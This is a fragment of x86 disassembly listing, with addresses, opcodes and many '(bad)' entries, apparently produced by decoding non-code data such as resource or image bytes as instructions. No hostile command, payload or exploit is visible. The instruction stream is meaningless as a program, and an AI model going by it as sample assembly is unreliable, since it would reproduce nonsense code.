  40d57c:	mov    ecx,0xf2ffb9b9
  40d581:	mov    edi,0x88edff78
  40d586:	add    bh,bh
  40d588:	in     al,0x7f
  40d58a:	add    bh,bh
  40d58c:	call   0xf1408660
  40d591:	loop   0x40d568
  40d593:	(bad)  
  40d594:	dec    edx
  40d596:	xchg   esp,eax
  40d597:	(bad)  
  40d598:	dec    edx
  40d59a:	xchg   esp,eax
  40d59b:	(bad)  
  40d59c:	dec    edx
  40d59e:	xchg   esp,eax
  40d59f:	(bad)  
  40d5a0:	dec    edx
  40d5a2:	xchg   esp,eax
  40d5a3:	(bad)  
  40d5a4:	dec    edx
  40d5a6:	xchg   esp,eax
  40d5a7:	(bad)  
  40d5a8:	dec    edx
  40d5aa:	xchg   esp,eax
  40d5ab:	(bad)  
  40d5ac:	dec    edx
  40d5ae:	xchg   esp,eax
  40d5af:	(bad)  
  40d5b0:	dec    edx
  40d5b2:	xchg   esp,eax
  40d5b3:	(bad)  
  40d5b4:	dec    edx
  40d5b6:	xchg   esp,eax
  40d5b7:	(bad)  
  40d5b8:	dec    edx
  40d5ba:	xchg   esp,eax
  40d5bb:	(bad)  
  40d5bc:	(bad)  
  40d5bd:	mov    ebx,0x8cd2ff94
  40d5c2:	xchg   bh,bh
  40d5c4:	lahf   
  40d5c5:	jo     0x40d637
  40d5c7:	(bad)  
  40d5c8:	stc    
  40d5c9:	cmc    
  40d5ca:	cmc    
  40d5cb:	(bad)  
  40d5cc:	(bad)  
  40d5cd:	(bad)  
  40d5ce:	(bad)  
  40d5cf:	(bad)  
  40d5d0:	(bad)  
  40d5d1:	(bad)  
  40d5d2:	(bad)  
  40d5d3:	(bad)  
  40d5d4:	(bad)  
  40d5d5:	(bad)  
  40d5d6:	(bad)  
  40d5d7:	(bad)  
  40d5d8:	(bad)  
  40d5d9:	(bad)  
  40d5da:	(bad)  
  40d5db:	(bad)  
  40d5dc:	(bad)  
  40d5dd:	(bad)  
  40d5de:	(bad)  
  40d5df:	(bad)  
  40d5e0:	(bad)  
  40d5e1:	(bad)  
  40d5e2:	(bad)  
  40d5e3:	(bad)  
  40d5e4:	jmp    ebp
  40d5e6:	in     eax,0xff
  40d5e8:	call   edx
  40d5ea:	sar    bh,cl
  40d5ec:	dec    esp
  40d5ee:	int3   
  40d5ef:	(bad)  
  40d5f0:	dec    ebx
  40d5f2:	retf   
  40d5f3:	(bad)  
  40d5f4:	inc    ebp
  40d5f6:	(bad)  
  40d5f9:	mov    esi,0xb9ffffbe
  40d5fe:	mov    ecx,0xb3b3ffff
  40d603:	(bad)  
  40d604:	jmp    FWORD PTR [ebp-0x58000053]
  40d60a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d60b:	(bad)  
  40d60c:	jmp    DWORD PTR [ecx-0x6400005f]
  40d612:	fwait
  40d613:	(bad)  
  40d614:	call   FWORD PTR [ecx-0x61000067]
  40d61a:	sahf   
  40d61b:	dec    esp
  40d61d:	test   DWORD PTR [ebp+0x555580ff],eax
  40d623:	in     eax,0x0
  40d625:	add    BYTE PTR [eax],al
  40d627:	inc    ebx
  40d628:	add    BYTE PTR [eax],al
  40d62a:	add    BYTE PTR [eax+eax*1],cl
  40d62d:	add    BYTE PTR [eax],al
  40d62f:	add    BYTE PTR [eax],al
  40d631:	add    BYTE PTR [eax],al
  40d633:	add    bh,bh
  40d635:	(bad)  
  40d636:	inc    DWORD PTR [eax]
  40d638:	je     0x40d6ae
  40d63a:	je     0x40d684
  40d63c:	mov    edx,0xedffbaba
  40d641:	mov    ebx,0x7fe4ff78
  40d646:	add    bh,bh
  40d648:	(bad)  [ebp+0x0]
  40d64b:	jmp    edi
  40d64d:	into   
  40d64e:	mov    dl,0xff
  40d650:	lock loop 0x40d626
  40d653:	(bad)  
  40d654:	inc    edi
  40d656:	mov    edi,edi
  40d658:	inc    edi
  40d65a:	mov    edi,edi
  40d65c:	inc    edi
  40d65e:	mov    edi,edi
  40d660:	inc    edi
  40d662:	mov    edi,edi
  40d664:	inc    edi
  40d666:	mov    edi,edi
  40d668:	inc    edi
  40d66a:	mov    edi,edi
  40d66c:	inc    edi
  40d66e:	mov    edi,edi
  40d670:	inc    edi
  40d672:	mov    edi,edi
  40d674:	inc    edi
  40d676:	mov    edi,edi
  40d678:	inc    edi
  40d67a:	mov    edi,edi
  40d67c:	inc    edi
  40d67e:	mov    edi,edi
  40d680:	(bad)  
  40d681:	mov    eax,0x75acff8d
  40d686:	jae    0x40d687
  40d688:	mov    bl,0x8c
  40d68a:	mov    edi,?
  40d68c:	(bad)  
  40d68d:	(bad)  
  40d68e:	(bad)  
  40d68f:	(bad)  
  40d690:	(bad)  
  40d691:	(bad)  
  40d692:	(bad)  
  40d693:	(bad)  
  40d694:	(bad)  
  40d695:	(bad)  
  40d696:	(bad)  
  40d697:	(bad)  
  40d698:	(bad)  
  40d699:	(bad)  
  40d69a:	(bad)  
  40d69b:	(bad)  
  40d69c:	(bad)  
  40d69d:	(bad)  
  40d69e:	(bad)  
  40d69f:	(bad)  
  40d6a0:	(bad)  
  40d6a1:	std    
  40d6a2:	std    
  40d6a3:	(bad)  
  40d6a4:	(bad)  
  40d6a5:	(bad)  
  40d6a7:	(bad)  
  40d6a8:	call   esi
  40d6aa:	(bad)  
  40d6ab:	(bad)  
  40d6ac:	call   edx
  40d6ae:	sar    bh,cl
  40d6b0:	dec    esp
  40d6b2:	int3   
  40d6b3:	(bad)  
  40d6b4:	dec    ebx
  40d6b6:	retf   
  40d6b7:	(bad)  
  40d6b8:	inc    ebp
  40d6ba:	(bad)  
  40d6bd:	mov    esi,0xb9ffffbe
  40d6c2:	mov    ecx,0xb3b3ffff
  40d6c7:	(bad)  
  40d6c8:	jmp    FWORD PTR [ebp-0x58000053]
  40d6ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6cf:	(bad)  
  40d6d0:	jmp    DWORD PTR [ecx-0x6400005f]
  40d6d6:	fwait
  40d6d7:	push   edx
  40d6d9:	xchg   ebx,eax
  40d6da:	xchg   ebx,eax
  40d6db:	call   FWORD PTR [edi+0x3aff6a6a]
  40d6e1:	es add BYTE PTR es:[eax],0x0
  40d6e6:	add    BYTE PTR [eax+eax*1],bl
  40d6e9:	add    BYTE PTR [eax],al
  40d6eb:	add    al,BYTE PTR [eax]
  40d6ed:	add    BYTE PTR [eax],al
  40d6ef:	add    BYTE PTR [eax],al
  40d6f1:	add    BYTE PTR [eax],al
  40d6f3:	add    bh,bh
  40d6f5:	(bad)  
  40d6f6:	inc    DWORD PTR [eax]
  40d6f8:	jne    0x40d76f
  40d6fa:	jne    0x40d744
  40d6fc:	mov    ebx,0xebffbbbb
  40d701:	mov    eax,0x75dbff79
  40d706:	add    bh,bh
  40d708:	shr    DWORD PTR [ebx+0x0],1
  40d70b:	jmp    esi
  40d70d:	int3   
  40d70e:	mov    bl,0xff
  40d710:	repnz loop 0x40d6e4
  40d713:	(bad)  
  40d714:	inc    edx
  40d716:	jnp    0x40d717
  40d718:	inc    edx
  40d71a:	jnp    0x40d71b
  40d71c:	inc    edx
  40d71e:	jnp    0x40d71f
  40d720:	inc    edx
  40d722:	jnp    0x40d723
  40d724:	inc    edx
  40d726:	jnp    0x40d727
  40d728:	inc    edx
  40d72a:	jnp    0x40d72b
  40d72c:	inc    edx
  40d72e:	jnp    0x40d72f
  40d730:	inc    edx
  40d732:	jnp    0x40d733
  40d734:	inc    edx
  40d736:	jnp    0x40d737
  40d738:	inc    edx
  40d73a:	jnp    0x40d73b
  40d73c:	inc    edx
  40d73e:	jnp    0x40d73f
  40d740:	inc    edx
  40d742:	jnp    0x40d743
  40d744:	stc    
  40d745:	mov    cl,0x82
  40d747:	jmp    DWORD PTR [ebx-0x40009591]
  40d74d:	lahf   
  40d74e:	lahf   
  40d74f:	(bad)  
  40d750:	(bad)  
  40d751:	(bad)  
  40d752:	(bad)  
  40d753:	(bad)  
  40d754:	(bad)  
  40d755:	(bad)  
  40d756:	(bad)  
  40d757:	(bad)  
  40d758:	(bad)  
  40d759:	(bad)  
  40d75a:	(bad)  
  40d75b:	(bad)  
  40d75c:	(bad)  
  40d75d:	(bad)  
  40d75e:	(bad)  
  40d75f:	(bad)  
  40d760:	push   ebp
  40d762:	cmc    
  40d763:	(bad)  
  40d764:	jmp    ecx
  40d766:	loope  0x40d767
  40d768:	(bad)  
  40d769:	fcmovnu st,st(3)
  40d76b:	(bad)  
  40d76c:	call   esi
  40d76e:	(bad)  
  40d76f:	(bad)  
  40d770:	call   edx
  40d772:	sar    bh,cl
  40d774:	dec    esp
  40d776:	int3   
  40d777:	(bad)  
  40d778:	dec    ebx
  40d77a:	retf   
  40d77b:	(bad)  
  40d77c:	inc    ebp
  40d77e:	(bad)  
  40d781:	mov    esi,0xb9ffffbe
  40d786:	mov    ecx,0xb3b3ffff
  40d78b:	(bad)  
  40d78c:	jmp    FWORD PTR [ebp-0x58000053]
  40d792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d793:	(bad)  
  40d794:	stc    
  40d795:	popf   
  40d796:	popf   
  40d797:	jmp    FWORD PTR [eax+esi*2+0x4b71ff70]
  40d79e:	dec    ebx
  40d79f:	ret    0x0
  40d7a2:	add    BYTE PTR [ecx],ch
  40d7a4:	add    BYTE PTR [eax],al
  40d7a6:	add    BYTE PTR [esi],al
	...
  40d7b4:	(bad)  
  40d7b5:	(bad)  
  40d7b6:	inc    DWORD PTR [eax]
  40d7b8:	jbe    0x40d830
  40d7ba:	jbe    0x40d804
  40d7bc:	mov    esp,0xe6ffbcbc
  40d7c1:	mov    bl,0x7a
  40d7c3:	call   esi
  40d7c5:	jl     0x40d7e5
  40d7c7:	jmp    ebx
  40d7c9:	mov    ebp,0xefefff96
  40d7ce:	out    dx,eax
  40d7cf:	push   ebx
  40d7d1:	jecxz  0x40d7a2
  40d7d3:	(bad)  
  40d7d4:	(bad)  
  40d7d5:	mov    esi,0xbeffff70
  40d7da:	jo     0x40d7db
  40d7dc:	(bad)  
  40d7dd:	mov    esi,0xbeffff70
  40d7e2:	jo     0x40d7e3
  40d7e4:	(bad)  
  40d7e5:	mov    esi,0xbeffff70
  40d7ea:	jo     0x40d7eb
  40d7ec:	(bad)  
  40d7ed:	mov    esi,0xbeffff70
  40d7f2:	jo     0x40d7f3
  40d7f4:	(bad)  
  40d7f5:	mov    esi,0xbeffff70
  40d7fa:	jo     0x40d7fb
  40d7fc:	(bad)  
  40d7fd:	mov    esi,0xbeffff70
  40d802:	jo     0x40d803
  40d804:	(bad)  
  40d805:	mov    esi,0xade6ff70
  40d80a:	ins    DWORD PTR es:[edi],dx
  40d80b:	call   FWORD PTR [ecx-0x40009995]
  40d811:	lahf   
  40d812:	lahf   
  40d813:	(bad)  
  40d814:	(bad)  
  40d815:	(bad)  
  40d816:	(bad)  
  40d817:	(bad)  
  40d818:	(bad)  
  40d819:	(bad)  
  40d81a:	(bad)  
  40d81b:	(bad)  
  40d81c:	(bad)  
  40d81d:	(bad)  
  40d81e:	(bad)  
  40d81f:	(bad)  
  40d820:	(bad)  
  40d821:	out    dx,al
  40d822:	out    dx,al
  40d823:	(bad)  
  40d824:	jmp    ebp
  40d826:	in     eax,0xff
  40d828:	jmp    ecx
  40d82a:	loope  0x40d82b
  40d82c:	(bad)  
  40d82d:	fcmovnu st,st(3)
  40d82f:	(bad)  
  40d830:	call   esi
  40d832:	(bad)  
  40d833:	(bad)  
  40d834:	call   edx
  40d836:	sar    bh,cl
  40d838:	dec    esp
  40d83a:	int3   
  40d83b:	(bad)  
  40d83c:	dec    ebx
  40d83e:	retf   
  40d83f:	(bad)  
  40d840:	inc    ebp
  40d842:	(bad)  
  40d845:	mov    esi,0xb9ffffbe
  40d84a:	mov    ecx,0xb3b3ffff
  40d84f:	(bad)  
  40d850:	stc    
  40d851:	test   eax,0x72acffa9
  40d856:	jb     0x40d857
  40d858:	test   BYTE PTR [eax+0x58],bl
  40d85b:	fld    QWORD PTR [eax]
  40d85d:	add    BYTE PTR [eax],al
  40d85f:	xor    al,BYTE PTR [eax]
  40d861:	add    BYTE PTR [eax],al
  40d863:	or     DWORD PTR [eax],eax
	...
  40d871:	add    BYTE PTR [eax],al
  40d873:	add    bh,bh
  40d875:	(bad)  
  40d876:	inc    DWORD PTR [eax]
  40d878:	jbe    0x40d8f0
  40d87a:	jbe    0x40d8c4
  40d87c:	mov    esi,0xeeffbebe
  40d881:	fcmovnb st,st(7)
  40d883:	(bad)  
  40d884:	jmp    0x40d86b
  40d886:	fdivp  st(7),st
  40d888:	(bad)
  40d88b:	call   ebp
  40d88d:	aad    0xd5
  40d88f:	push   ebx
  40d891:	loop   0x40d860
  40d893:	(bad)  
  40d894:	(bad)  
  40d895:	mov    ebx,0xbbffff65
  40d89a:	gs (bad) 
  40d89c:	(bad)  
  40d89d:	mov    ebx,0xbbffff65
  40d8a2:	gs (bad) 
  40d8a4:	(bad)  
  40d8a5:	mov    ebx,0xbbffff65
  40d8aa:	gs (bad) 
  40d8ac:	(bad)  
  40d8ad:	mov    ebx,0xbbffff65
  40d8b2:	gs (bad) 
  40d8b4:	(bad)  
  40d8b5:	mov    ebx,0xbbffff65
  40d8ba:	gs (bad) 
  40d8bc:	(bad)  
  40d8bd:	mov    ebx,0xbbffff65
  40d8c2:	gs (bad) 
  40d8c4:	(bad)  
  40d8c5:	mov    ebx,0xbbffff65
  40d8ca:	gs jmp esi
  40d8cd:	stos   DWORD PTR es:[edi],eax
  40d8ce:	jmp    FWORD PTR fs:[esi+esi*2-0x7c53009b]
  40d8d6:	cmp    edi,0xfffffff2
  40d8d9:	in     al,dx
  40d8da:	in     al,dx
  40d8db:	(bad)  
  40d8dc:	(bad)  
  40d8dd:	cld    
  40d8de:	cld    
  40d8df:	(bad)  
  40d8e0:	(bad)  
  40d8e1:	out    dx,eax
  40d8e2:	out    dx,eax
  40d8e3:	(bad)  
  40d8e4:	(bad)  
  40d8e5:	jmp    0xe640d8d3
  40d8ea:	in     eax,0xff
  40d8ec:	jmp    ecx
  40d8ee:	loope  0x40d8ef
  40d8f0:	(bad)  
  40d8f1:	fcmovnu st,st(3)
  40d8f3:	(bad)  
  40d8f4:	call   esi
  40d8f6:	(bad)  
  40d8f7:	(bad)  
  40d8f8:	call   edx
  40d8fa:	sar    bh,cl
  40d8fc:	dec    esp
  40d8fe:	int3   
  40d8ff:	(bad)  
  40d900:	dec    ebx
  40d902:	retf   
  40d903:	(bad)  
  40d904:	inc    ebp
  40d906:	(bad)  
  40d909:	mov    esi,0xaff2ffbe
  40d90e:	scas   eax,DWORD PTR es:[edi]
  40d90f:	jmp    FWORD PTR [esp+esi*2+0x5e89ff74]
  40d916:	pop    esi
  40d917:	loop   0x40d945
  40d919:	sbb    eax,0x381d
  40d91e:	add    BYTE PTR [edx],cl
  40d920:	add    BYTE PTR [eax],al
  40d922:	add    BYTE PTR [ecx],al
	...
  40d934:	(bad)  
  40d935:	(bad)  
  40d936:	inc    DWORD PTR [eax]
  40d938:	ja     0x40d9b1
  40d93a:	ja     0x40d984
  40d93c:	mov    edi,0xd3ffbfbf
  40d941:	rcl    ebx,cl
  40d943:	call   FWORD PTR [edi-0x4f006061]
  40d949:	mov    al,0xb0
  40d94b:	jmp    edi
  40d94d:	out    0xe7,eax
  40d94f:	push   esp
  40d951:	loop   0x40d91e
  40d953:	(bad)  
  40d954:	push   DWORD PTR [edi-0x4a0000a6]
  40d95a:	push   esp
  40d95b:	(bad)  
  40d95c:	call   FWORD PTR [ebp-0x600000f4]
  40d962:	adc    bh,bh
  40d964:	jmp    DWORD PTR [ebx-0x560000e2]
  40d96a:	cs (bad) 
  40d96c:	jmp    FWORD PTR [ecx+edi*1+0x44b0ffff]
  40d973:	(bad)  
  40d974:	push   DWORD PTR [edi-0x480000a6]
  40d97a:	pop    edx
  40d97b:	(bad)  
  40d97c:	push   DWORD PTR [edi-0x480000a6]
  40d982:	pop    edx
  40d983:	(bad)  
  40d984:	push   DWORD PTR [edi-0x480000a6]
  40d98a:	pop    edx
  40d98b:	(bad)  
  40d98c:	push   DWORD PTR [edi-0x4d0a00a6]
  40d992:	pop    edx
  40d993:	push   DWORD PTR [ebx-0x66009e81]
  40d999:	data16 dec sp
  40d99d:	mov    al,0xb0
  40d99f:	push   edx
  40d9a1:	loope  0x40d984
  40d9a3:	(bad)  
  40d9a4:	(bad)  
  40d9a5:	out    dx,eax
  40d9a6:	out    dx,eax
  40d9a7:	(bad)  
  40d9a8:	(bad)  
  40d9a9:	jmp    0xe640d997
  40d9ae:	in     eax,0xff
  40d9b0:	jmp    ecx
  40d9b2:	loope  0x40d9b3
  40d9b4:	(bad)  
  40d9b5:	fcmovnu st,st(3)
  40d9b7:	(bad)  
  40d9b8:	call   esi
  40d9ba:	(bad)  
  40d9bb:	(bad)  
  40d9bc:	call   edx
  40d9be:	sar    bh,cl
  40d9c0:	dec    esp
  40d9c2:	int3   
  40d9c3:	(bad)  
  40d9c4:	stc    
  40d9c5:	(bad)
  40d9c8:	int3   
  40d9c9:	xchg   ebp,eax
  40d9ca:	xchg   ebp,eax
  40d9cb:	call   FWORD PTR [edi+0x7eff6b6b]
  40d9d1:	push   esp
  40d9d2:	push   esp
  40d9d3:	scas   al,BYTE PTR es:[edi]
  40d9d4:	add    BYTE PTR [eax],al
  40d9d6:	add    BYTE PTR [eax+eax*1],bl
  40d9d9:	add    BYTE PTR [eax],al
  40d9db:	push   es
  40d9dc:	(bad)  
  40d9dd:	(bad)  
  40d9de:	inc    DWORD PTR [eax]
	...
  40d9f4:	(bad)  
  40d9f5:	(bad)  
  40d9f6:	inc    DWORD PTR [eax]
  40d9f8:	js     0x40da72
  40d9fa:	js     0x40da44
  40d9fc:	rol    al,0xc0
  40d9ff:	(bad)  
  40da00:	fcmovu st,st(2)
  40da02:	(bad)  
  40da04:	(bad)  
  40da06:	fcos   
  40da08:	mov    edi,0xc6c6ffc7
  40da0e:	(bad)  
  40da0f:	push   ebp
  40da11:	loop   0x40d9dc
  40da13:	(bad)  
  40da14:	push   DWORD PTR [ebx-0x5a0000b1]
  40da1a:	and    edi,edi
  40da1c:	stc    
  40da1d:	rcr    BYTE PTR [ecx-0x1c120c01],cl
  40da23:	push   ebp
  40da25:	(bad)  [ebp-0x69300901]
  40da2b:	push   esi
  40da2d:	ret    
  40da2e:	ja     0x40da2f
  40da30:	cli    
  40da31:	scas   al,BYTE PTR es:[edi]
  40da32:	cmp    edi,edi
  40da34:	std    
  40da35:	mov    ds:0x9dffff1d,eax
  40da3a:	or     edi,edi
  40da3c:	jmp    DWORD PTR [eax-0x580000ea]
  40da42:	sub    edi,edi
  40da44:	jmp    FWORD PTR [edx-0x520000ce]
  40da4a:	cmp    al,0xff
  40da4c:	push   DWORD PTR [ebx-0x4c0000b1]
  40da52:	dec    edi
  40da53:	(bad)  
  40da54:	push   DWORD PTR [ebx-0x602000b1]
  40da5a:	push   ebx
  40da5b:	jmp    FWORD PTR [ecx+edi*2+0x6699ff60]
  40da62:	data16 (bad) 
  40da64:	mov    ecx,0xd2ff9191
  40da69:	mov    dl,0xb2
  40da6b:	jmp    esi
  40da6d:	enter  0xffc8,0xe6
  40da71:	(bad)  
  40da72:	(bad)  
  40da73:	push   edx
  40da75:	rcl    ecx,1
  40da77:	jmp    esi
  40da79:	mov    esi,0xacd9ffbe
  40da7e:	lods   al,BYTE PTR ds:[esi]
  40da7f:	(bad)  
  40da80:	mov    edi,0x9fff8e8e
  40da85:	ins    BYTE PTR es:[edi],dx
  40da86:	ins    BYTE PTR es:[edi],dx
  40da87:	dec    DWORD PTR [ebp+0x6ecf5e5e]
  40da8d:	dec    ecx
  40da8e:	dec    ecx
  40da8f:	pop    ecx
  40da90:	add    BYTE PTR [eax],al
  40da92:	add    BYTE PTR ds:0x3000000,cl
	...
  40dab4:	(bad)  
  40dab5:	(bad)  
  40dab6:	inc    DWORD PTR [eax]
  40dab8:	jns    0x40db33
  40daba:	jns    0x40db04
  40dabc:	rol    ecx,0xc1
  40dabf:	call   ebp
  40dac1:	aad    0xd5
  40dac3:	call   FWORD PTR [edi-0x4f006061]
  40dac9:	mov    al,0xb0
  40dacb:	jmp    esp
  40dacd:	in     al,0xe4
  40dacf:	push   esi
  40dad1:	jecxz  0x40da9b
  40dad3:	(bad)  
  40dad4:	jmp    FWORD PTR [eax+edi*1+0x7cc8fbff]
  40dadb:	push   esi
  40dadd:	div    dh
  40dadf:	push   ebp
  40dae1:	cmc    
  40dae2:	cmc    
  40dae3:	push   ebx
  40dae5:	repz repz push ecx
  40dae9:	icebp  
  40daea:	icebp  
  40daeb:	(bad)  
  40daec:	out    dx,eax
  40daed:	out    dx,eax
  40daee:	out    dx,eax
  40daef:	(bad)  
  40daf0:	in     eax,dx
  40daf1:	in     eax,dx
  40daf2:	in     eax,dx
  40daf3:	(bad)  
  40daf4:	jmp    0x40dae1
  40daf6:	jmp    0x40daf7
  40daf8:	jmp    0xaed4:0xeeffeaea
  40daff:	(bad)  
  40db00:	out    dx,al
  40db01:	into   
  40db02:	sahf   
  40db03:	push   edx
  40db05:	mov    edi,0xb0f6ff72
  40db0a:	inc    edi
  40db0b:	(bad)  
  40db0c:	stc    
  40db0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db0e:	sub    bh,bh
  40db10:	call   FWORD PTR [edx+ecx*1+0x139fffff]
  40db17:	(bad)  
  40db18:	jmp    DWORD PTR [ebp-0x570000dc]
  40db1e:	sub    al,0xff
  40db20:	out    dx,eax
  40db21:	mov    eax,ds:0x8fcfff37
  40db26:	push   edx
  40db27:	push   DWORD PTR [esi-0x5600a483]
  40db2d:	je     0x40db8e
  40db2f:	call   DWORD PTR [ebx-0x6900999a]
  40db35:	data16 dec WORD PTR [edx+0x7efb6363]
  40db3d:	push   esi
  40db3e:	push   esi
  40db3f:	jecxz  0x40dbb1
  40db41:	dec    esi
  40db42:	dec    esi
  40db43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db44:	dec    esi
  40db45:	cmp    edi,DWORD PTR [ebx]
  40db47:	push   ebx
  40db48:	add    BYTE PTR [eax],al
  40db4a:	add    BYTE PTR [ecx],bl
  40db4c:	add    BYTE PTR [eax],al
  40db4e:	add    BYTE PTR [eax+eax*1],cl
  40db51:	add    BYTE PTR [eax],al
  40db53:	add    eax,DWORD PTR [eax]
	...
  40db71:	add    BYTE PTR [eax],al
  40db73:	add    bh,bh
  40db75:	(bad)  
  40db76:	inc    DWORD PTR [eax]
  40db78:	jnp    0x40dbf5
  40db7a:	jnp    0x40dbc4
  40db7c:	ret    0xc2c2
  40db7f:	(bad)  
  40db80:	(bad)  
  40db82:	fdiv   st(7),st
  40db84:	loope  0x40db67
  40db86:	loope  0x40db87
  40db88:	clc    
  40db89:	clc    
  40db8a:	clc    
  40db8b:	push   esi
  40db8d:	div    dh
  40db8f:	(bad)  
  40db90:	clc    
  40db91:	jecxz  0x40db59
  40db93:	(bad)  
  40db94:	(bad)  
  40db95:	mov    ebp,0xfafaff5e
  40db9a:	cli    
  40db9b:	(bad)  
  40db9c:	clc    
  40db9d:	clc    
  40db9e:	clc    
  40db9f:	push   esi
  40dba1:	div    dh
  40dba3:	push   ebp
  40dba5:	cmc    
  40dba6:	cmc    
  40dba7:	push   ebx
  40dba9:	repz repz push ecx
  40dbad:	icebp  
  40dbae:	icebp  
  40dbaf:	(bad)  
  40dbb0:	out    dx,eax
  40dbb1:	out    dx,eax
  40dbb2:	out    dx,eax
  40dbb3:	(bad)  
  40dbb4:	in     eax,dx
  40dbb5:	in     eax,dx
  40dbb6:	in     eax,dx
  40dbb7:	(bad)  
  40dbb8:	jmp    0x40dba5
  40dbba:	jmp    0x40dbbb
  40dbbc:	jmp    0xe8e8:0xe8ffeaea
  40dbc3:	jmp    esi
  40dbc5:	out    0xe6,al
  40dbc7:	jmp    esp
  40dbc9:	in     al,0xe4
  40dbcb:	jmp    edx
  40dbcd:	loop   0x40dbb1
  40dbcf:	jmp    eax
  40dbd1:	loopne 0x40dbb3
  40dbd3:	jmp    ebp
  40dbd5:	shl    DWORD PTR [ebp-0x67371701],1
  40dbdb:	(bad)  
  40dbdc:	in     eax,dx
  40dbdd:	mov    edx,0xb1f1ff6e
  40dbe2:	push   edx
  40dbe3:	push   ebp
  40dbe5:	test   eax,0x9cffff36
  40dbea:	or     bh,bh
  40dbec:	call   FWORD PTR [edi-0x5c0000ef]
  40dbf2:	push   ds
  40dbf3:	(bad)  
  40dbf4:	jmp    DWORD PTR [ebp+0x6f6fff25]
  40dbfa:	outs   dx,DWORD PTR ds:[esi]
  40dbfb:	out    dx,al
  40dbfc:	add    BYTE PTR [eax],al
  40dbfe:	add    BYTE PTR [esi-0x80000000],ah
  40dc04:	add    BYTE PTR [eax],al
  40dc06:	add    BYTE PTR [ebx+0x0],ah
  40dc09:	add    BYTE PTR [eax],al
  40dc0b:	dec    edi
  40dc0c:	add    BYTE PTR [eax],al
  40dc0e:	add    BYTE PTR [ecx],dh
  40dc10:	add    BYTE PTR [eax],al
  40dc12:	add    BYTE PTR ds:0x1000000,cl
	...
  40dc34:	(bad)  
  40dc35:	(bad)  
  40dc36:	inc    DWORD PTR [eax]
  40dc38:	jl     0x40dcb6
  40dc3a:	jl     0x40dc84
  40dc3c:	(bad)  
  40dc3d:	(bad)  
  40dc3e:	(bad)  
  40dc3f:	(bad)  
  40dc40:	sti    
  40dc41:	sti    
  40dc42:	sti    
  40dc43:	(bad)  
  40dc44:	cli    
  40dc45:	cli    
  40dc46:	cli    
  40dc47:	(bad)  
  40dc48:	stc    
  40dc49:	stc    
  40dc4a:	stc    
  40dc4b:	(bad)  
  40dc4c:	clc    
  40dc4d:	clc    
  40dc4e:	clc    
  40dc4f:	(bad)  
  40dc50:	jmp    0x40dc30
  40dc52:	retf   
  40dc53:	(bad)  
  40dc54:	(bad)  
  40dc55:	clc    
  40dc56:	out    dx,al
  40dc57:	(bad)  
  40dc58:	cld    
  40dc59:	cld    
  40dc5a:	cld    
  40dc5b:	(bad)  
  40dc5c:	cli    
  40dc5d:	cli    
  40dc5e:	cli    
  40dc5f:	(bad)  
  40dc60:	clc    
  40dc61:	clc    
  40dc62:	clc    
  40dc63:	push   esi
  40dc65:	div    dh
  40dc67:	push   ebp
  40dc69:	cmc    
  40dc6a:	cmc    
  40dc6b:	push   ebx
  40dc6d:	repz repz push ecx
  40dc71:	icebp  
  40dc72:	icebp  
  40dc73:	(bad)  
  40dc74:	out    dx,eax
  40dc75:	out    dx,eax
  40dc76:	out    dx,eax
  40dc77:	(bad)  
  40dc78:	in     eax,dx
  40dc79:	in     eax,dx
  40dc7a:	in     eax,dx
  40dc7b:	(bad)  
  40dc7c:	jmp    0x40dc69
  40dc7e:	jmp    0x40dc7f
  40dc80:	jmp    0xe8e8:0xe8ffeaea
  40dc87:	jmp    esi
  40dc89:	out    0xe6,al
  40dc8b:	jmp    esp
  40dc8d:	in     al,0xe4
  40dc8f:	jmp    edx
  40dc91:	loop   0x40dc75
  40dc93:	jmp    eax
  40dc95:	loopne 0x40dc77
  40dc97:	(bad)  
  40dc98:	(bad)  
  40dc9a:	fdivp  st(7),st
  40dc9c:	fstp   st(5)
  40dc9e:	(bad)  
  40dca0:	fcmovnu st,st(3)
  40dca2:	(bad)  
  40dca4:	(bad)  
  40dca6:	fcos   
  40dca8:	xlat   BYTE PTR ds:[ebx]
  40dca9:	xlat   BYTE PTR ds:[ebx]
  40dcaa:	xlat   BYTE PTR ds:[ebx]
  40dcab:	(bad)  
  40dcac:	fcmovne st,st(6)
  40dcae:	mov    ebx,0x9fc5dfff
  40dcb3:	(bad)  
  40dcb4:	jmp    0xa0404970
  40dcb9:	lahf   
  40dcba:	lahf   
  40dcbb:	sti    
  40dcbc:	add    BYTE PTR [edx+0x5757ee82],0x57
  40dcc3:	fld    DWORD PTR [ebx+0x43]
  40dcc6:	inc    ebx
  40dcc7:	enter  0x3636,0x36
  40dccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dccc:	add    BYTE PTR [eax],al
  40dcce:	add    BYTE PTR [edi+0x0],cl
  40dcd1:	add    BYTE PTR [eax],al
  40dcd3:	push   ss
  40dcd4:	add    BYTE PTR [eax],al
  40dcd6:	add    BYTE PTR [ecx],al
	...
  40dcf4:	(bad)  
  40dcf5:	(bad)  
  40dcf6:	inc    DWORD PTR [eax]
  40dcf8:	jnp    0x40dd75
  40dcfa:	jnp    0x40dd45
  40dcfc:	(bad)
  40dcff:	(bad)  
  40dd00:	cld    
  40dd01:	cld    
  40dd02:	cld    
  40dd03:	(bad)  
  40dd04:	sti    
  40dd05:	sti    
  40dd06:	sti    
  40dd07:	(bad)  
  40dd08:	jmp    0x40dcf5
  40dd0a:	jmp    0x40dd0b
  40dd0c:	aad    0xd5
  40dd0e:	aad    0xff
  40dd10:	mov    dh,0x9d
  40dd12:	popf   
  40dd13:	call   FWORD PTR [edi-0x47009394]
  40dd19:	xchg   edx,eax
  40dd1a:	xchg   edx,eax
  40dd1b:	(bad)  
  40dd1c:	mov    edi,0xd0ff9c9c
  40dd21:	mov    dh,0xb6
  40dd23:	(bad)  
  40dd24:	(bad)  
  40dd26:	iret   
  40dd27:	jmp    ebx
  40dd29:	(bad)  
  40dd2a:	(bad)  
  40dd2b:	push   ebp
  40dd2d:	cmc    
  40dd2e:	cmc    
  40dd2f:	push   ebx
  40dd31:	repz repz push ecx
  40dd35:	icebp  
  40dd36:	icebp  
  40dd37:	(bad)  
  40dd38:	out    dx,eax
  40dd39:	out    dx,eax
  40dd3a:	out    dx,eax
  40dd3b:	(bad)  
  40dd3c:	in     eax,dx
  40dd3d:	in     eax,dx
